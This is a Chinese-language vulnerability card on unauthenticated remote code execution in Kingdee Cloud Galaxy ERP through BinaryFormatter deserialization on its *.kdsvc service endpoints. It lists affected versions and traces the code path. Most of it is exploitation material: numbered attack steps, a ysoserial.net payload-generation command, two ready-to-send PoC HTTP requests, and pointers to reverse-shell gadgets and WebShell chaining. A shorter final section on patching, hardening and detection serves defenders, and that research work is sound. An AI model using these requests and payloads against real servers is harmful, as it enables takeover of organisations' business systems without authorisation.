---
id: web-dotnet-deser-kingdee-kdsvc-binaryformatter-rce
title: 金蝶云星空 KDSVC 接口 format=3 BinaryFormatter 前台反序列化 RCE
type: scenario
domain: web
path: web/dotnet/deserialization
technique: kingdee-kdsvc-binaryformatter-deserialization
aliases:
- 金蝶云星空反序列化
- KDSVCHandler format=3
- Kingdee.BOS.ServiceFacade.KDServiceFx 反序列化
- KDSVC BinaryFormatter RCE
tags:
- dotnet
- binaryformatter
- deserialization
- rce
- erp
- kingdee
- kdsvc
- ysoserial
- iis
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
affected_versions: 金蝶云星空 V8.X 私有云/私有云（订阅）/混合云：PT-146903 [8.0.0.202202] 至 PT-149006 [8.1.0.20230608]；V7.X：PT116278 [7.0.352.16] 至 PT-146899 [7.7.0.202112]；V6.2 及以下：PT123230 [6.2.1012.4] 及以下。PT-146930 [8.1.0.20221110] 起在 Common.config 默认禁用 format=3 Binary
verification:
  verified_by: verifier-V556
  verified_at: '2026-11-12T00:15:07+08:00'
  notes: 已对照原文全文与34张截图核对：KDServiceHandler→KDSVCHandler→StartRequest 的 MapPath 路径解析（图10）、ModulePipeline 六模块（图13）、MessageFormats 零基枚举 Binary=3（图12/15）、SerializerManager.Create→BinaryFormatterProxy（图15/16）、ServiceExecutor 仅基元类型走安全解析其余倒 proxy.Deserialize（图17/18）、DevReportService.GetBillData 与 BizTipsInfosService.SaveBizTipsInfos 签名及匿名回显 PoC（图19-21）、加固后报错 EnabledKDSVCBinary=False/KDSVCDefaultFormat=KingdeeXml（图22）、format=4 KingdeeXml 内层仍走 BinaryFormatter 且有 UnpackCheckSum 防护（图25/26）均一致；版本区间与原文表格逐字一致，已 set-versions。修正：原稿变体段把 format=2 写成 Json，按零基枚举（Xml=0/Json=1/Atom=2/Binary=3/KingdeeXml=4，与 format=3→Binary、format=4→KingdeeXml 吻合）改为 format=1(Json)/format=2(Atom)。dedup 候选 U9 DataTransfer、ERP OpenServerDialog 为不同产品不同入口，非同一链。PoC 未在本机执行。
---

## 一句话结论

金蝶云星空把 `*.kdsvc` 请求交给 `Kingdee.BOS.ServiceFacade.KDServiceFx` 处理，其 `ExecuteServiceModule` 按请求里的 `format` 字段选择序列化器；`format=3` 对应 `BinaryFormatterProxy`，而 `ServiceExecutor` 只有对 string/枚举/数值等基元类型才走安全解析，其余参数类型（`object`、`object[]`、`List<T>` 等）一律落入 `BinaryFormatter.Deserialize`，攻击者挑选参数类型可被反序列化的 ServicesStub 服务方法、在 `apN`/`parameters` 里塞 ysoserial.net 载荷，即可未登录执行任意命令。

## 原理

- 入口映射：`Web.config` 把 `path="*.kdsvc"` 交给 `Kingdee.BOS.ServiceFacade.KDServiceFx.KDServiceHandler`。`KDSVCHandler.ProcessRequest → ProcessRequestInternal → ExecuteRequest → RequestExcuteRuntime.StartRequest`，其中 `Server.MapPath(path)` 得到形如 `...\WebSite\Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBillData.common.kdsvc` 的物理路径，`ServiceTypeManager.BuidServiceType` 据此从 URL 中解析出「程序集.类.方法」并加载对应 DLL/类型。URL 结构即 `/K3Cloud/<命名空间>.<类>.<方法>.<任意后缀>.kdsvc`。
- 管线：`ModulePipeline.ExcuteRequest` 依次执行 `SecurityModule`、`VerifyUserModule`、`VerifyVersionModule`、`WebApiModule`、`ExecuteServiceModule`、`XFrameModule` 的 `OnProcess`；这些 ServicesStub 服务允许匿名调用（文中 PoC 请求不带任何会话 Cookie 即成功）。
- 参数提取：`ExecuteServiceModule.OnProcess` 调 `GetServiceParameters`，两种传参形态等价：
  - `{"ap0":"...","ap1":"...","format":"3"}`（按方法参数顺序取 `ap0/ap1/...`）；
  - `{"parameters":["...","..."],"format":"3"}`（JSONArray 按顺序填充）。
- 序列化器选择：`SerializerProxy` 构造时按 `format` 进入 `SerializerManager.Create`，`MessageFormats` 枚举为 `Xml/Json/Atom/Binary/KingdeeXml`，`Binary` 的序号是 3，对应 `new BinaryFormatterProxy(...)`。
- 反序列化点：`ServiceExecutor.Execute` 先 `Activator.CreateInstance(svcType.MapToCLRType, new object[]{ context })` 实例化服务类（要求类有可接收 `KDServiceContext` 或其派生类型的构造函数），再 `DeserializeParameters` 逐个参数按方法签名声明的 CLR 类型反序列化。`Deserialize` 中只有 `string`、`enum`、`int/byte/float/double/long/DateTime/decimal/bool` 走安全的 `Parse` 分支，其他类型统一执行 `this.proxy.Deserialize(content, type)`，即 `BinaryFormatter.Deserialize`。
- 为什么能 RCE：`BinaryFormatter` 按流中的程序集与类型名加载类型并触发其反序列化回调；`BinaryFormatterProxy` 未设置有效的 `SerializationBinder` 白名单，于是 `ActivitySurrogateSelectorFromFile` 等 ysoserial.net gadget 在反序列化阶段执行任意代码，命令输出可写回 HTTP 响应（回显）。
- 攻击面选择：`Kingdee.BOS.ServiceFacade.ServicesStub.dll` 中存在大量可前台调用的服务类，例如：
  - `DevReportService.GetBillData(string formId, string reportId, object[] pkArray)`——第三个参数 `object[]` 会走 BinaryFormatter；
  - `BizTipsInfosService.SaveBizTipsInfos(string bIsHost, List<BizTipsInfos> tips)`——第二个参数 `List<T>` 同样走 BinaryFormatter。
  参数个数必须与方法签名一致，否则在反序列化前抛 500；构造函数须匹配 `KDServiceContext` 参数。

## 触发条件

- 目标为受影响版本范围内的金蝶云星空（私有云/混合云部署，IIS + .NET Framework），`/K3Cloud/` 下的 `*.kdsvc` 路由可达。
- `Common.config` 未加固或仍允许 Binary：`KDSVCDefaultFormat` 不为 4、`EnabledKDSVCBinary` 不为 false（旧版本默认允许）。
- 攻击者能访问 Web 端口（文中为 8000/80），无需任何账号会话。
- 目标进程可加载 ysoserial.net 载荷依赖的框架程序集（`System.Windows.Forms`、`System.Web` 等，常规 IIS 部署具备）。

## 利用步骤

1. 确认目标存在 KDSVC 路由：任意 `/K3Cloud/*.kdsvc` 返回非 404 的框架错误即说明处理器生效。
2. 用 ysoserial.net 生成 BinaryFormatter 回显载荷（生成携带命令执行的类，编译进序列化流）：
   ```text
   ysoserial.exe -c "ExploitClass.cs;System.Windows.Forms.dll;System.Web.dll;System.dll" \
     -f BinaryFormatter -o base64 -g ActivitySurrogateSelectorFromFile
   ```
3. 选择参数类型非基元的服务方法，把 base64 载荷放进对应 `apN`（或 `parameters` 数组），并显式带 `format=3`。
4. 发送请求，响应体中直接携带命令执行结果（回显）。
5. 若回显受限，可换用写文件/反弹 shell 类 gadget，或改用其他 ServicesStub 方法重试。

## PoC

最小请求（`DevReportService.GetBillData`，第三个参数是 `object[]`）：

```http
POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBillData.common.kdsvc HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"ap0":"1","ap1":"1","ap2":"<ysoserial base64 载荷>","format":"3"}
```

等价写法：

```http
POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.BizTipsInfosService.SaveBizTipsInfos.common.kdsvc HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"ap0":"1","ap1":"<ysoserial base64 载荷>","format":"3"}
```

```text
# 判断依据：响应为 200，正文中出现命令执行结果；
# 若版本已加固，响应错误信息中出现 EnabledKDSVCBinary=False、KDSVCDefaultFormat=KingdeeXml 等字样。
```

## 变体与关联

- 变体：按 `MessageFormats` 零基枚举，`format=1`（Json）、`format=2`（Atom）等其它序列化器走不同代理，但同一 `ServiceExecutor` 参数类型分支仍可能把非基元参数交给不安全的代理；排查时按 `MessageFormats` 枚举逐个确认。
- 变体：`format=4`（KingdeeXml）会先把内容强制转换为 `KingdeeXMLPack`，再对其 `Data` 字段调用 `BinaryFormatterProxy`；新版本在反序列化前用 `UnpackCheckSum` 校验数据签名（`EnabledKDSVCDataCheckSum=true`），未持有校验材料无法伪造，但“XML 外壳 + 内层 BinaryFormatter”的设计说明底层仍是不安全反序列化，不能只依赖外层格式转换。
- 关联：[[web-dotnet-deser-u9-datatransfer-binaryformatter-rce]]（国产 ERP 另一例 BinaryFormatter 无 Binder）；[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]]、[[web-dotnet-deser-activitysurrogateselector-disable-typecheck-bypass]]（本卡所用 gadget 的禁用类型检查绕过原理）。
- 关联：本卡与同产品的 ScpSupRegHandler 上传漏洞常组合使用：先反序列化 RCE 或直接上传 WebShell。

## 检测与防御

- 根治：升级到最新补丁（文章测试过 PT-151002 [8.1.0.20230921]）；在 `App_Data\Common.config` 中设置 `KDSVCDefaultFormat=4`、`EnabledKDSVCBinary=false`、`EnabledKDSVCDataCheckSum=true`，并确认版本支持（校验特性自 PT-146930 [8.1.0.20221110] 起生效）。
- 根治：改造 `/K3Cloud/*.kdsvc` 的反序列化实现，删除 `BinaryFormatter` 路径，改为显式 DTO + JSON/DataContract；若短期保留，必须设置严格的 `SerializationBinder` 类型白名单，并对服务方法做调用权限校验。
- 加固：`*.kdsvc` 端点限制来源 IP/内网访问；IIS 应用池最低权限；Web 目录不可写。
- 检测：IIS 日志中 `/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.*.kdsvc` 且请求体含 `"format":"3"` 与 base64 载荷（BinaryFormatter 流 base64 常以 `AAEAAAD/////` 开头）；`w3wp.exe` 异常拉起 `cmd.exe`/`powershell.exe`；响应体中出现命令回显或 ysoserial 头。
- 检测：同一来源短时间内遍历多个 ServicesStub 服务名与方法名（参数个数探测）。
